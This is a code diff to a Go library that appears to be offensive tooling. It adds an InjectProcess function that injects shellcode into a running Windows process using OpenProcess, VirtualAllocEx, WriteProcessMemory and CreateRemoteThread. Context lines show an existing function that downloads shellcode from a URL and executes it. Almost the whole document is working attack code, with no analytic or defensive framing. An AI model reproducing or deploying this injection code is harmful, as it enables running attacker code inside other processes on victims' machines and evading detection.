@@ -62,6 +62,45 @@ func DownloadAndExecuteShellcode(url string) error {
 	return ExecShellcode(shellcode)
 }
 
+// InjectProcess opens an existing running process by PID and injects shellcode into it
+// via VirtualAllocEx + WriteProcessMemory + CreateRemoteThread.
+func InjectProcess(shellcode []byte, pid uint32) error {
+	const (
+		PROCESS_ALL_ACCESS     = 0x1F0FFF
+		MEM_COMMIT             = 0x1000
+		MEM_RESERVE            = 0x2000
+		PAGE_EXECUTE_READWRITE = 0x40
+	)
+	kernel32 := syscall.NewLazyDLL("kernel32.dll")
+	openProcess := kernel32.NewProc("OpenProcess")
+	virtualAllocEx := kernel32.NewProc("VirtualAllocEx")
+	writeProcessMemory := kernel32.NewProc("WriteProcessMemory")
+	createRemoteThread := kernel32.NewProc("CreateRemoteThread")
+
+	handle, _, err := openProcess.Call(PROCESS_ALL_ACCESS, 0, uintptr(pid))
+	if handle == 0 {
+		return fmt.Errorf("OpenProcess failed: %w", err)
+	}
+	defer syscall.CloseHandle(syscall.Handle(handle))
+
+	remoteAddr, _, err := virtualAllocEx.Call(handle, 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+	if remoteAddr == 0 {
+		return fmt.Errorf("VirtualAllocEx failed: %w", err)
+	}
+
+	var written uintptr
+	ret, _, err := writeProcessMemory.Call(handle, remoteAddr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), uintptr(unsafe.Pointer(&written)))
+	if ret == 0 {
+		return fmt.Errorf("WriteProcessMemory failed: %w", err)
+	}
+
+	threadHandle, _, err := createRemoteThread.Call(handle, 0, 0, remoteAddr, 0, 0, 0)
+	if threadHandle == 0 {
+		return fmt.Errorf("CreateRemoteThread failed: %w", err)
+	}
+	return nil
+}
+
 // StartRemoteThread creates a new process from the provided binary path in suspended mode,
 // allocates remote memory, writes shellcode into the remote process, and starts a remote thread
 // to execute the shellcode. After injection the main thread of the process is resumed.
